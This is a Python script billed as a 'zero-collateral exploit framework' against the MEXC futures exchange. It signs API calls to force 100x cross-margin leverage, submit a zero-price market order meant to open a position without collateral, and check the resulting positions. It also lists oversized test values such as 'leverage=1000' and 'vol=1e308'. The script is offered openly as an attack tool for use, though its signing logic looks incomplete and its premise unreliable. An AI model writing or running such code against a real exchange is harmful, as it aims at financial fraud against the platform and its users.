#!/usr/bin/env python3
# MEXC Futures Zero-Collateral Exploit Framework v10.2 (Signature Fixed)

import hmac
import hashlib
import requests
import time
import json
import logging
from urllib.parse import urlencode
from collections import OrderedDict

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('mexc_futures.log'),
        logging.StreamHandler()
    ]
)

class MEXCFuturesAttacker:
    def __init__(self, api_key, api_secret):
        self.api_key = api_key
        self.api_secret = api_secret
        self.base_url = "https://contract.mexc.com"
        self.timeout = 30  # Increased timeout
        self._session = requests.Session()
        self._session.headers.update({
            'Content-Type': 'application/json',
            'ApiKey': self.api_key
        })

    def __del__(self):
        self._session.close()

    def _generate_signature(self, params):
        """Fixed signature generation with exact parameter order"""
        mandatory = {
            'timestamp': int(time.time() * 1000),
            'recvWindow': 5000
        }
        params.update(mandatory)
        
        # MEXC's required parameter order
        ordered_params = OrderedDict([
            ('symbol', params['symbol']),
            ('leverage', params.get('leverage', '')),
            ('positionType', params.get('positionType', '')),
            ('timestamp', params['timestamp']),
            ('recvWindow', params['recvWindow'])
        ])
        
        query = '&'.join([f"{k}={v}" for k,v in ordered_params.items() if v != ''])
        signature = hmac.new(
            self.api_secret.encode(),
            query.encode(),
            hashlib.sha256
        ).hexdigest()
        
        logging.debug(f"Signature Base String: {query}")
        logging.debug(f"Generated Signature: {signature}")
        return signature

    def _force_high_leverage(self, symbol, leverage=100):
        """Leverage override with fixed signature"""
        params = {
            'symbol': symbol,
            'leverage': leverage,
            'positionType': 2  # Cross-margin
        }
        params['signature'] = self._generate_signature(params)
        
        try:
            response = self._session.post(
                f"{self.base_url}/api/v1/private/position/change_margin",
                params=params,
                timeout=self.timeout
            )
            return response.json()
        except Exception as e:
            return {"error": str(e)}

    def _place_zero_collateral_order(self, symbol):
        """Market order with fixed signature"""
        params = {
            'symbol': symbol,
            'price': 0,
            'vol': 1,
            'side': 1,
            'type': 1,
            'openType': 2,
            'leverage': 100
        }
        params['signature'] = self._generate_signature(params)
        
        try:
            response = self._session.post(
                f"{self.base_url}/api/v1/private/order/submit",
                json=params,
                timeout=self.timeout
            )
            return response.json()
        except Exception as e:
            return {"error": str(e)}

    def _verify_position(self, symbol):
        """Position check with fixed signature"""
        params = {'symbol': symbol}
        params['signature'] = self._generate_signature(params)
        
        try:
            response = self._session.get(
                f"{self.base_url}/api/v1/private/position/open_positions",
                params=params,
                timeout=self.timeout
            )
            return response.json()
        except Exception as e:
            return {"error": str(e)}

    def execute_attacks(self, symbol):
        """Execute all attacks with fail-safes"""
        results = {}
        
        # 1. Leverage Exploit
        leverage_result = self._force_high_leverage(symbol)
        results['leverage_override'] = leverage_result
        
        # 2. Zero-Collateral Order (only if leverage succeeded)
        if leverage_result.get('code') == 200:
            results['zero_collateral_order'] = self._place_zero_collateral_order(symbol)
        else:
            results['zero_collateral_order'] = {"skipped": "Leverage change failed"}
        
        # 3. Position Verification
        results['position_verification'] = self._verify_position(symbol)
        
        # 4. Test Vectors
        results['test_vectors'] = [
            "symbol=INVALID_SYMBOL",
            "leverage=1000",
            "vol=1e308"
        ]
        
        return results

def main():
    print("""
    ███╗   ███╗███████╗██╗  ██╗ ██████╗    ███████╗██╗   ██╗████████╗██╗   ██╗██████╗ ███████╗
    ████╗ ████║██╔════╝╚██╗██╔╝██╔════╝    ██╔════╝██║   ██║╚══██╔══╝██║   ██║██╔══██╗██╔════╝
    ██╔████╔██║█████╗   ╚███╔╝ ██║  ███╗   █████╗  ██║   ██║   ██║   ██║   ██║██████╔╝███████╗
    ██║╚██╔╝██║██╔══╝   ██╔██╗ ██║   ██║   ██╔══╝  ██║   ██║   ██║   ██║   ██║██╔══██╗╚════██║
    ██║ ╚═╝ ██║███████╗██╔╝ ██╗╚██████╔╝   ██║     ╚██████╔╝   ██║   ╚██████╔╝██║  ██║███████║
    ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝      ╚═════╝    ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚══════╝
    FUTURES EXPLOIT FRAMEWORK v10.2 (Signature Fixed)
    """)

    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--api-key', required=True)
    parser.add_argument('--api-secret', required=True)
    parser.add_argument('--symbol', default='BTC_USDT')
    args = parser.parse_args()

    attacker = MEXCFuturesAttacker(args.api_key, args.api_secret)
    
    try:
        results = attacker.execute_attacks(args.symbol)
        print("\n🔥 EXPLOIT RESULTS 🔥")
        print(json.dumps(results, indent=2, ensure_ascii=False))
        
        if results.get('position_verification', {}).get('code') == 200:
            print("\n💀 VERIFIED POSITION:")
            for pos in results['position_verification'].get('data', []):
                print(f"  {pos['symbol']} @ {pos['leverage']}x leverage")
    except KeyboardInterrupt:
        print("\n⚠️ Stopped by user")
    except Exception as e:
        print(f"\n⛔ FATAL ERROR: {str(e)}")
    finally:
        attacker.__del__()

if __name__ == "__main__":
    main()
